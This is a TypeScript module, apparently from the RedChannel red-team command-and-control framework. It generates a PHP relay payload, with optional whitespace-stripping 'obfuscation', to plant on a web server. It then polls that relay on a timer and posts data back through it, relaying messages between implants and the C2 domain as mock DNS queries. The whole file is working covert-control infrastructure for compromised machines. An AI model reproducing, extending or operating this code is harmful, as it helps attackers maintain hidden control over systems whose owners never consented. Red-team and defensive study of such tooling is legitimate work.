import axios from "axios";
import querystring from "querystring";
import * as fs from "fs";
import { Constants, emsg } from "../utils";
import { Module } from "./base";
import Logger from "../lib/logger";
import { C2AnswerType, C2MessageRequest, C2MessageResponse } from "../lib/redchannel";
import { RedChannelConfig } from "../pb/config";

const PROXY_PAYLOAD_PATH = "payloads/proxy.php";

export enum ProxyStatus {
    ERROR_KEY_MISMATCH = "ERR 1",
    ERROR_KEY_MISSING = "ERR 2",
    ERROR_INVALID_AGENT_ID = "ERR 3",
    ERROR_INVALID_DATA_SENT = "ERR 5",
    ERROR_INVALID_REQUEST = "ERR 6",
    ERROR_WRITING_TO_AGENT_STORAGE = "ERR 7",
    ERROR_WRITING_TO_C2_STORAGE = "ERR 8",
    OK_RECEIVED_FROM_AGENT = "OK PA",
    OK_RECEIVED_FROM_C2 = "OK PC",
    OK_NO_DATA = "OK ND",
}

export default class ProxyModule implements Module {
    fetchTimer: NodeJS.Timeout | null;
    payload: string;
    log: Logger;

    constructor(protected config: RedChannelConfig, protected messageHandler: (request: C2MessageRequest, response: C2MessageResponse) => void, log?: Logger) {
        this.log = log ?? new Logger();

        this.fetchTimer = null;
        this.payload = "";
    }

    proxyInit() {
        const proxyConfig = this.config.proxy;
        if (proxyConfig?.enabled) {
            this.log.info(`c2-proxy enabled, checkin at interval: ${proxyConfig.interval}ms`);
            this.proxyFetchLoop();
        } else {
            this.log.info("c2-proxy is disabled");
        }
    }

    execute(): void {
        if (!this.config.proxy?.key) throw new Error("proxy key is required");

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync(PROXY_PAYLOAD_PATH);
            proxyPhp = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const proxyErrorKeys = Object.keys(ProxyStatus);
        for (const keyIndex in proxyErrorKeys) {
            const re = new RegExp(`\\[${proxyErrorKeys[keyIndex]}\\]`, "g");
            proxyPhp = proxyPhp.replace(re, ProxyStatus[proxyErrorKeys[keyIndex]]);
        }
        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");

        // "obfuscation"
        if (this.config.proxy.obfuscatePayload) {
            proxyPhp = proxyPhp.replace(/\n/g, "");
            proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
        }

        this.payload = `<?php ${proxyPhp} ?>`;
        this.log?.info(`proxy payload set: \n${this.payload}`);
    }

    async sendToProxy(agentId: string, records: string[]) {
        if (!this.config.proxy?.key.length) throw new Error(`cannot send to proxy: proxy key is required`);

        const recordsString = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: recordsString,
            k: this.config.proxy.key,
            i: agentId,
            p: "c",
        };

        try {
            const res = await axios.post(this.config.proxy.url, querystring.stringify(data));
            const message = `proxy send response: ${res.data}`;
            this.log.debug(message);
        } catch (ex) {
            const message = `proxy send failed: ${emsg(ex)}`;
            this.log.error(message);
        }
        return;
    }

    async getFromProxy() {
        if (!this.config.proxy?.enabled) {
            this.log.error("c2-proxy is disabled");
            return;
        }

        if (!this.config.proxy?.url) {
            this.log.error("proxy config is missing the url");
            return;
        }
        if (!this.config.proxy?.key) {
            this.log.error("proxy config is missing a key");
            return;
        }

        const data = {
            k: this.config.proxy.key,
            f: "a",
        };

        return axios
            .post(this.config.proxy.url, querystring.stringify(data))
            .then((result) => this.processProxyData(result.data))
            .catch((ex) => {
                this.log.error(`proxy fetch failed: ${emsg(ex)}`);
            });
    }

    processProxyData(proxyData: string) {
        if (!this.config.c2?.domain.length) throw new Error("cannot process proxy data: c2 domain is required");
        if (!this.config.proxy?.url.length) throw new Error("cannot process proxy data: proxy url is required");

        // we expect the proxy to respond with ERR 1, or similar
        // this.log.debug(`proxy response:\n${proxyData}`);
        if (proxyData.length < 2) throw new Error(`unexpected response (too small): '${proxyData}'`);

        // everything was ok, but no data from agents in proxy storage
        if (proxyData === ProxyStatus.OK_NO_DATA) return;

        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data: '${proxyData}'`);

        // a known error was throw
        if (Object.values(ProxyStatus).includes(proxyData as ProxyStatus)) {
            const codeName = Object.keys(ProxyStatus)[Object.values(ProxyStatus).indexOf(proxyData as ProxyStatus)];
            throw new Error(`proxy returned code ${codeName}`);
        }

        // grab proxy response and build mock dns queries
        const data = proxyData.replace(/;$/, "").split(";");
        data.forEach((q) => {
            const req: C2MessageRequest = {
                connection: {
                    remoteAddress: this.config.proxy?.url || "127.0.0.1",
                    type: C2AnswerType.TYPE_PROXY,
                },
            };
            const res: C2MessageResponse = {
                question: [
                    {
                        type: C2AnswerType.TYPE_PROXY,
                        name: `${q}.${this.config.c2?.domain}`,
                    },
                ],
                answer: [],
                end: () => {
                    return;
                },
            };
            this.messageHandler(req, res);
        });
    }

    proxyFetch() {
        this.getFromProxy();
        this.log.info("fetching data from proxy...");
    }

    proxyStart() {
        const message = this.config.proxy?.enabled ? `starting proxy checkin at interval: ${this.config.proxy.interval}ms` : "stopping proxy checkin";
        this.log.info(message);
        this.proxyFetchLoop();
    }

    proxyClearInterval() {
        if (this.fetchTimer) clearTimeout(this.fetchTimer);
    }

    proxyFetchLoop() {
        this.proxyClearInterval();

        if (!this.config.proxy?.enabled) {
            this.log.warn("proxy is disabled");
            return;
        }

        if (!this.config.proxy.url) {
            throw new Error("proxy config is missing the url");
        }
        if (!this.config.proxy.key) {
            throw new Error("proxy config is missing a key");
        }

        this.getFromProxy()?.finally(() => {
            this.fetchTimer = setTimeout(() => {
                this.proxyFetchLoop();
            }, this.config.proxy?.interval || 5000);
        });
    }
}
